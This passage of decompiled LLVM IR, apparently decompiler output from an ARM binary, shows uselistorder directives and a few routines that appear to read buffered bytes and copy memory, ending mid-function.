  uselistorder i32 %v3_11e04, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11df0, { 2, 1, 0 }
  uselistorder i32 %v3_11db4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_11d90, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11d58, { 0, 1, 3, 2 }
  uselistorder i32 %v4_11d4c, { 1, 2, 0 }
  uselistorder i32 %v0_11d4c, { 1, 0 }
  uselistorder i32 %v1_11d54.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_11d0c, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_11cf0, { 1, 0 }
  uselistorder i32 %storemerge179, { 1, 0 }
  uselistorder i32 %v0_11ccc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_11cc0, { 3, 0, 1, 2 }
  uselistorder i32 %v2_11c9c, { 1, 0 }
  uselistorder i32 %v2_11c94, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_11c8c, { 1, 0 }
  uselistorder i32 %v0_11c84, { 3, 0, 1, 2 }
  uselistorder i32 %v0_11c6c, { 1, 0 }
  uselistorder i32 %v1_11c48, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11c48, { 1, 0, 2 }
  uselistorder i32 %v0_11c20, { 3, 0, 1, 2 }
  uselistorder i1 %v2_11c00, { 2, 1, 0 }
  uselistorder i32 %v2_11b8c, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_11b7c, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v1_11ca4, { 2, 6, 0, 7, 5, 1, 3, 4, 8 }
  uselistorder i32 %v0_11be8, { 3, 0, 5, 4, 6, 7, 9, 1, 2, 8 }
  uselistorder i32 %v0_11b28, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_11b0c, { 1, 0 }
  uselistorder i32 %v1_11b04, { 1, 2, 0 }
  uselistorder i32 %v2_11af8, { 1, 0 }
  uselistorder i32 %v1_11af8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11af8, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i32 %v1_11af0, { 1, 0, 2 }
  uselistorder i32 %v0_11ae8, { 3, 0, 1, 2 }
  uselistorder i1 %v3_11ac8, { 1, 0 }
  uselistorder i32 %v2_11ac8, { 1, 0 }
  uselistorder i32 %v2_11ac4, { 3, 2, 1, 4, 5, 7, 0, 8, 6, 9 }
  uselistorder i1 %v7_11ab0, { 1, 0 }
  uselistorder i32 %v1_11ab4, { 2, 1, 0 }
  uselistorder i1 %v2_11aa4, { 1, 0 }
  uselistorder i32 %v0_11aa0, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_11a88, { 1, 0 }
  uselistorder i32 %stack_var_-192.7, { 1, 0, 2 }
  uselistorder i32 %v1_11a7c, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_11a34, { 1, 2, 0 }
  uselistorder i32 %v2_11a30, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11a18, { 1, 3, 5, 6, 0, 4, 2 }
  uselistorder i1 %v2_11a10, { 1, 0 }
  uselistorder i32 %v0_11a1c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_119f8, { 1, 0 }
  uselistorder i32 %v0_119e4, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i32 %v0_119d8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_119cc, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v0_119c8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_119a4, { 1, 0 }
  uselistorder i32 %v0_11958, { 1, 0 }
  uselistorder i32 %v0_11944, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-192.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1186c, { 1, 0, 2 }
  uselistorder i32 %v0_11860, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_1185c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11858, { 2, 1, 0 }
  uselistorder i32 %v1_11844, { 4, 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-192.2, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11838, { 1, 0 }
  uselistorder i32 %v5_117f0, { 1, 0 }
  uselistorder i32 %v0_117dc, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_116fc.v1_117108, { 1, 0 }
  uselistorder i32 %v0_117a4, { 1, 0 }
  uselistorder i32 %v4_11790, { 1, 2, 0 }
  uselistorder i32 %v0_11734, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11a14, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %v1_11670, { 1, 0 }
  uselistorder i32* %stack_var_-79, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %tmp, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 26, 25, 46, 28, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 58, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 1, 68, 69, 70, 71, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 16, 17, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 1, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 8, 9, 10, 44, 11, 22, 21, 20, 23, 12, 13, 19, 14, 15, 1, 18, 16, 17, 24, 25, 26, 45, 43, 27, 29, 28, 30, 4, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 40, 2, 41, 42, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 13, 11, 12, 14, 15, 0, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 59, 19, 20, 21, 22, 23, 24, 25, 26, 0, 27, 28, 29, 30, 31, 61, 32, 33, 34, 35, 36, 37, 38, 60, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 55, 17, 18, 19, 20, 21, 22, 23, 24, 25, 58, 26, 27, 28, 29, 57, 30, 31, 32, 33, 34, 35, 36, 56, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 59, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 28, 29, 30, 31, 61, 32, 33, 34, 35, 36, 37, 38, 60, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i32 (i32, i32, i32, i32)* @function_155b0, { 1, 0 }
  uselistorder i32 1104006501, { 1, 4, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_17bc8.531 to i32), { 1, 0, 2 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_15084, { 2, 1, 0 }
  uselistorder i8 45, { 1, 0, 3, 2, 4 }
  uselistorder i32 (i32)* @function_155b8, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_153ac, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11de8, { 2, 0, 1 }
  uselistorder label %bb271, { 1, 0 }
  uselistorder label %dec_label_pc_11d48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11cc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c94, { 1, 0 }
  uselistorder label %.thread49, { 1, 0 }
  uselistorder label %dec_label_pc_11c6c, { 1, 0 }
  uselistorder label %dec_label_pc_11c48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11c2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11bf8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11bf4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11b50, { 1, 0 }
  uselistorder label %bb258, { 1, 0 }
  uselistorder label %dec_label_pc_11b40, { 1, 0 }
  uselistorder label %dec_label_pc_11b34, { 1, 0 }
  uselistorder label %bb252, { 1, 0 }
  uselistorder label %bb250, { 1, 0 }
  uselistorder label %bb248, { 1, 0 }
  uselistorder label %.thread161, { 1, 0 }
  uselistorder label %bb244, { 1, 0 }
  uselistorder label %bb242, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb239, { 1, 0 }
  uselistorder label %dec_label_pc_11a54, { 2, 1, 0 }
  uselistorder label %bb236, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1197c, { 1, 0 }
  uselistorder label %dec_label_pc_1193c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_118e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_118d8, { 1, 0 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %dec_label_pc_117cc, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %dec_label_pc_116e8, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_11e2c(i32 %arg1, i16* %arg2) local_unnamed_addr {
dec_label_pc_11e2c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11e40 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_11e40, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_11e2c
  %v0_11e4c.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e4c.pr, label %bb4, label %.thread2

bb:                                               ; preds = %dec_label_pc_11e2c
  %v1_11e44 = load i32, i32* @r4, align 4
  %v3_11e44 = xor i32 %v1_11e44, %arg1
  %v2_11e48 = sub i32 -1, %v3_11e44
  store i32 %v2_11e48, i32* %r0.global-to-local, align 4
  %v4_11e48 = icmp eq i32 %v3_11e44, -1
  br i1 %v4_11e48, label %bb4, label %.thread2

bb4:                                              ; preds = %thread-pre-split, %bb
  %v1_11e4c = load i32, i32* @r7, align 4
  %v2_11e4c = trunc i32 %v1_11e4c to i16
  store i16 %v2_11e4c, i16* %arg2, align 2
  %v5_11e4c = load i32, i32* @r7, align 4
  %v6_11e4c = load i32, i32* %r1.global-to-local, align 4
  %v7_11e4c = sub i32 %v6_11e4c, %v5_11e4c
  store i32 %v7_11e4c, i32* %r1.global-to-local, align 4
  %v7_11e50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %bb, %thread-pre-split, %bb4
  %v7_11e50 = phi i32 [ %v2_11e48, %bb ], [ %arg1, %thread-pre-split ], [ %v7_11e50.pre, %bb4 ]
  ret i32 %v7_11e50

; uselistorder directives
  uselistorder i32 %v2_11e48, { 1, 0 }
  uselistorder i32 %v3_11e44, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_11e54(i8* %arg1) local_unnamed_addr {
dec_label_pc_11e54:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_11e54 = load i32, i32* @r4, align 4
  store i32 %v3_11e54, i32* %stack_var_-8, align 4
  %v0_11e58 = load i32, i32* @r0, align 4
  %v1_11e58 = add i32 %v0_11e58, 16
  %v2_11e58 = inttoptr i32 %v1_11e58 to i32*
  %v3_11e58 = load i32, i32* %v2_11e58, align 4
  store i32 %v3_11e58, i32* %r2.global-to-local, align 4
  %v1_11e5c = add i32 %v0_11e58, 24
  %v2_11e5c = inttoptr i32 %v1_11e5c to i32*
  %v3_11e5c = load i32, i32* %v2_11e5c, align 4
  %v3_11e60 = icmp ult i32 %v3_11e58, %v3_11e5c
  store i32 %v0_11e58, i32* @r4, align 4
  br i1 %v3_11e60, label %bb, label %dec_label_pc_11e78

bb:                                               ; preds = %dec_label_pc_11e54
  %v2_11e68 = inttoptr i32 %v3_11e58 to i8*
  %v3_11e68 = load i8, i8* %v2_11e68, align 1
  %v4_11e68 = zext i8 %v3_11e68 to i32
  store i32 %v4_11e68, i32* %r0.global-to-local, align 4
  %v6_11e68 = add i32 %v3_11e58, 1
  store i32 %v6_11e68, i32* %r2.global-to-local, align 4
  store i32 %v6_11e68, i32* %v2_11e58, align 4
  br label %dec_label_pc_11f78

dec_label_pc_11e78:                               ; preds = %dec_label_pc_11e54
  %v1_11e78 = inttoptr i32 %v0_11e58 to i8*
  %v2_11e78 = load i8, i8* %v1_11e78, align 1
  %v3_11e78 = zext i8 %v2_11e78 to i32
  %v1_11e7c = and i32 %v3_11e78, 131
  %tmp22 = icmp ugt i32 %v1_11e7c, 128
  br i1 %tmp22, label %dec_label_pc_11e98, label %dec_label_pc_11e88

dec_label_pc_11e88:                               ; preds = %dec_label_pc_11e78
  store i32 128, i32* @r1, align 4
  %v0_11e8c = call i32 @function_136e0()
  store i32 %v0_11e8c, i32* %r0.global-to-local, align 4
  %v2_11e90 = icmp eq i32 %v0_11e8c, 0
  br i1 %v2_11e90, label %dec_label_pc_11e88.dec_label_pc_11e98_crit_edge, label %dec_label_pc_11f74

dec_label_pc_11e88.dec_label_pc_11e98_crit_edge:  ; preds = %dec_label_pc_11e88
  %v0_11e98.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11e98

dec_label_pc_11e98:                               ; preds = %dec_label_pc_11e88.dec_label_pc_11e98_crit_edge, %dec_label_pc_11e78
  %v2_11ee4 = phi i32 [ %v0_11e98.pre, %dec_label_pc_11e88.dec_label_pc_11e98_crit_edge ], [ %v0_11e58, %dec_label_pc_11e78 ]
  %v1_11e98 = inttoptr i32 %v2_11ee4 to i8*
  %v2_11e98 = load i8, i8* %v1_11e98, align 1
  %v3_11e98 = zext i8 %v2_11e98 to i32
  store i32 %v3_11e98, i32* %r2.global-to-local, align 4
  %v1_11e9c = add i32 %v2_11ee4, 1
  %v2_11e9c = inttoptr i32 %v1_11e9c to i8*
  %v3_11e9c = load i8, i8* %v2_11e9c, align 1
  %v4_11e9c = zext i8 %v3_11e9c to i32
  %v4_11ea0 = mul nuw nsw i32 %v4_11e9c, 256
  %v5_11ea0 = or i32 %v4_11ea0, %v3_11e98
  store i32 %v5_11ea0, i32* %r2.global-to-local, align 4
  %v1_11ea4 = and i32 %v3_11e98, 2
  %v2_11ea4 = icmp eq i32 %v1_11ea4, 0
  br i1 %v2_11ea4, label %dec_label_pc_11ed4, label %dec_label_pc_11eac

dec_label_pc_11eac:                               ; preds = %dec_label_pc_11e98
  %tmp23 = urem i8 %v2_11e98, 2
  %v1_11eac = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_11eac
  %v4_11eb0 = and i32 %tmp18, 4
  %v5_11eb0 = add i32 %v4_11eb0, %v2_11ee4
  %v1_11eb4 = add i32 %v5_11eb0, 36
  %v2_11eb4 = inttoptr i32 %v1_11eb4 to i8*
  %v3_11eb4 = load i8, i8* %v2_11eb4, align 1
  %v4_11eb4 = zext i8 %v3_11eb4 to i32
  %v1_11eb8 = add nsw i32 %v5_11ea0, -1
  store i32 %v1_11eb8, i32* %r2.global-to-local, align 4
  %v3_11ebc = sdiv i32 %v1_11eb8, 256
  store i32 %v3_11ebc, i32* %r1.global-to-local, align 4
  store i32 %v4_11eb4, i32* %r0.global-to-local, align 4
  %v2_11ec8 = add i32 %v2_11ee4, 40
  %v3_11ec8 = inttoptr i32 %v2_11ec8 to i32*
  store i32 0, i32* %v3_11ec8, align 4
  %v0_11ecc = load i32, i32* %r1.global-to-local, align 4
  %v1_11ecc = trunc i32 %v0_11ecc to i8
  %v2_11ecc = load i32, i32* @r4, align 4
  %v3_11ecc = add i32 %v2_11ecc, 1
  %v4_11ecc = inttoptr i32 %v3_11ecc to i8*
  store i8 %v1_11ecc, i8* %v4_11ecc, align 1
  br label %dec_label_pc_11f08

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11e98
  %v1_11ed4 = add i32 %v2_11ee4, 16
  store i32 %v1_11ed4, i32* %r1.global-to-local, align 4
  %v1_11ed8 = inttoptr i32 %v1_11ed4 to i32*
  %v2_11ed8 = load i32, i32* %v1_11ed8, align 4
  store i32 %v2_11ed8, i32* %r1.global-to-local, align 4
  %v3_11ed8 = add i32 %v2_11ee4, 20
  %v4_11ed8 = inttoptr i32 %v3_11ed8 to i32*
  %v5_11ed8 = load i32, i32* %v4_11ed8, align 4
  %v9_11edc = icmp eq i32 %v5_11ed8, %v2_11ed8
  br i1 %v9_11edc, label %dec_label_pc_11eec, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11ed4
  %v2_11ee0 = inttoptr i32 %v2_11ed8 to i8*
  %v3_11ee0 = load i8, i8* %v2_11ee0, align 1
  %v4_11ee0 = zext i8 %v3_11ee0 to i32
  store i32 %v4_11ee0, i32* %r0.global-to-local, align 4
  %v6_11ee0 = add i32 %v2_11ed8, 1
  store i32 %v6_11ee0, i32* %r1.global-to-local, align 4
  store i32 %v6_11ee0, i32* %v1_11ed8, align 4
  br label %dec_label_pc_11f78

dec_label_pc_11eec:                               ; preds = %dec_label_pc_11ed4
  %v1_11eec = add i32 %v2_11ee4, 4
  %v2_11eec = inttoptr i32 %v1_11eec to i32*
  %v3_11eec = load i32, i32* %v2_11eec, align 4
  %v4_11ef4 = icmp eq i32 %v3_11eec, -2
  br i1 %v4_11ef4, label %dec_label_pc_11ef8, label %dec_label_pc_11f10

dec_label_pc_11ef8:                               ; preds = %dec_label_pc_11eec
  %v1_11ef8 = or i32 %v5_11ea0, 4
  store i32 %v1_11ef8, i32* %r2.global-to-local, align 4
  store i8 %v3_11e9c, i8* %v2_11e9c, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f08

dec_label_pc_11f08:                               ; preds = %dec_label_pc_11eac, %dec_label_pc_11ef8
  %v0_11f08 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f08 = trunc i32 %v0_11f08 to i8
  %v2_11f08 = load i32, i32* @r4, align 4
  %v3_11f08 = inttoptr i32 %v2_11f08 to i8*
  store i8 %v1_11f08, i8* %v3_11f08, align 1
  br label %dec_label_pc_11f78

dec_label_pc_11f10:                               ; preds = %dec_label_pc_11eec
  %v1_11f10 = and i32 %v4_11ea0, 768
  %v2_11f10 = icmp eq i32 %v1_11f10, 0
  br i1 %v2_11f10, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_11f10
  store i32 ptrtoint (i32** @global_var_1810c.316 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_11f10, %bb19
  store i32 73500, i32* @lr, align 4
  %v1_11f18 = xor i1 %v2_11f10, true
  call void @__pseudo_cond_branch(i1 %v1_11f18, i32 ptrtoint (i32* @global_var_e7a0.540 to i32))
  %v0_11f1c = load i32, i32* @r4, align 4
  %v1_11f1c = add i32 %v0_11f1c, 8
  store i32 %v1_11f1c, i32* %r2.global-to-local, align 4
  %v1_11f20 = inttoptr i32 %v1_11f1c to i32*
  %v2_11f20 = load i32, i32* %v1_11f20, align 4
  store i32 %v2_11f20, i32* %r2.global-to-local, align 4
  %v3_11f20 = add i32 %v0_11f1c, 12
  %v4_11f20 = inttoptr i32 %v3_11f20 to i32*
  %v5_11f20 = load i32, i32* %v4_11f20, align 4
  %v9_11f24 = icmp eq i32 %v5_11f20, %v2_11f20
  br i1 %v9_11f24, label %dec_label_pc_11f58, label %dec_label_pc_11f2c

dec_label_pc_11f2c:                               ; preds = %bb20
  %v2_11f2c = add i32 %v0_11f1c, 24
  %v3_11f2c = inttoptr i32 %v2_11f2c to i32*
  store i32 %v2_11f20, i32* %v3_11f2c, align 4
  %v0_11f30 = load i32, i32* @r4, align 4
  store i32 %v0_11f30, i32* %r0.global-to-local, align 4
  %v2_11f34 = call i32 @function_136b4(i32 %v0_11f30)
  store i32 %v2_11f34, i32* %r0.global-to-local, align 4
  %v2_11f38 = icmp eq i32 %v2_11f34, 0
  br i1 %v2_11f38, label %dec_label_pc_11f74, label %dec_label_pc_11f40

dec_label_pc_11f40:                               ; preds = %dec_label_pc_11f2c
  %v0_11f40 = load i32, i32* @r4, align 4
  %v1_11f40 = add i32 %v0_11f40, 20
  %v2_11f40 = inttoptr i32 %v1_11f40 to i32*
  %v3_11f40 = load i32, i32* %v2_11f40, align 4
  %v2_11f44 = add i32 %v0_11f40, 24
  %v3_11f44 = inttoptr i32 %v2_11f44 to i32*
  store i32 %v3_11f40, i32* %v3_11f44, align 4
  %v0_11f48 = load i32, i32* @r4, align 4
  %v1_11f48 = add i32 %v0_11f48, 16
  %v2_11f48 = inttoptr i32 %v1_11f48 to i32*
  %v3_11f48 = load i32, i32* %v2_11f48, align 4
  %v1_11f4c = inttoptr i32 %v3_11f48 to i8*
  %v2_11f4c = load i8, i8* %v1_11f4c, align 1
  %v3_11f4c = zext i8 %v2_11f4c to i32
  store i32 %v3_11f4c, i32* %r0.global-to-local, align 4
  %v5_11f4c = add i32 %v3_11f48, 1
  store i32 %v5_11f4c, i32* %v2_11f48, align 4
  br label %dec_label_pc_11f78

dec_label_pc_11f58:                               ; preds = %bb20
  %v1_11f58 = inttoptr i32 %v0_11f1c to i8*
  store i32 %v0_11f1c, i32* %r0.global-to-local, align 4
  %v2_11f5c = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_11f5c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11f64 = call i32 @function_1358c(i8* %v1_11f58, i32 %v2_11f5c, i32 1)
  store i32 %v5_11f64, i32* %r0.global-to-local, align 4
  %v2_11f68 = icmp eq i32 %v5_11f64, 0
  br i1 %v2_11f68, label %dec_label_pc_11f74, label %bb21

bb21:                                             ; preds = %dec_label_pc_11f58
  %v4_11f6c = load i8, i8* %stack_var_-9, align 1
  %v5_11f6c = sext i8 %v4_11f6c to i32
  store i32 %v5_11f6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f78

dec_label_pc_11f74:                               ; preds = %dec_label_pc_11f58, %dec_label_pc_11e88, %dec_label_pc_11f2c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f78

dec_label_pc_11f78:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_11f40, %dec_label_pc_11f08, %dec_label_pc_11f74
  %v2_11f7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11f7c, i32* @r4, align 4
  %v8_11f7c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_11f7c

; uselistorder directives
  uselistorder i32 %v2_11ed8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11e98, { 1, 0, 2 }
  uselistorder i32 %v2_11ee4, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_11e58, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 9, 0, 1, 11, 2, 3, 13, 4, 5, 6, 7, 8, 12, 10 }
  uselistorder i8** @global_var_18144.264, { 2, 1, 0 }
  uselistorder i32** @global_var_1810c.316, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11f78, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_11f74, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_11f08, { 1, 0 }
}

define i32 @function_11f90(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11f90:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_11f90 = load i32, i32* @r1, align 4
  %v1_11f90 = load i32, i32* %r0.global-to-local, align 4
  %v2_11f90 = sub i32 %v0_11f90, %v1_11f90
  %v3_11f90 = icmp ult i32 %v0_11f90, %v1_11f90
  %v4_11f90 = xor i32 %v1_11f90, %v0_11f90
  %v5_11f90 = xor i32 %v2_11f90, %v0_11f90
  %v6_11f90 = and i32 %v5_11f90, %v4_11f90
  %v7_11f90 = icmp slt i32 %v6_11f90, 0
  store i1 %v7_11f90, i1* %cpsr_v.global-to-local, align 1
  %v8_11f90 = icmp slt i32 %v2_11f90, 0
  store i1 %v8_11f90, i1* %cpsr_n.global-to-local, align 1
  %v9_11f90 = icmp eq i32 %v0_11f90, %v1_11f90
  store i1 %v9_11f90, i1* @cpsr_z, align 1
  br i1 %v3_11f90, label %dec_label_pc_121dc, label %dec_label_pc_11f98

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11f90
  br i1 %v9_11f90, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_11f98
  %merge = phi i32 [ %v0_11f90, %dec_label_pc_11f98 ], [ %v2_12270, %bb143 ], [ %v11_1228c, %bb146 ], [ %v7_1228c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_11f98
  %v5_11f9c = inttoptr i32 %v1_11f90 to i8*
  store i8* %v5_11f9c, i8** %stack_var_-8, align 4
  %v0_11fa0 = load i32, i32* @r2, align 4
  %v2_11fa0 = add i32 %v0_11fa0, -4
  store i32 %v2_11fa0, i32* %r2.global-to-local, align 4
  %v4_11fa0 = sub i32 3, %v0_11fa0
  %v5_11fa0 = and i32 %v4_11fa0, %v0_11fa0
  %v6_11fa0 = icmp slt i32 %v5_11fa0, 0
  store i1 %v6_11fa0, i1* %cpsr_v.global-to-local, align 1
  %v7_11fa0 = icmp slt i32 %v2_11fa0, 0
  store i1 %v7_11fa0, i1* %cpsr_n.global-to-local, align 1
  %v5_11fa4 = icmp slt i32 %v0_11fa0, 4
  br i1 %v5_11fa4, label %bb133, label %dec_label_pc_11fa8

dec_label_pc_11fa8:                               ; preds = %bb
  %v1_11fa8 = urem i32 %v1_11f90, 4
  store i32 %v1_11fa8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11fa8 = icmp eq i32 %v1_11fa8, 0
  br i1 %v2_11fa8, label %dec_label_pc_11fb0, label %dec_label_pc_12054

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11fa8
  %v1_11fb0 = urem i32 %v0_11f90, 4
  store i32 %v1_11fb0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11fb0 = icmp eq i32 %v1_11fb0, 0
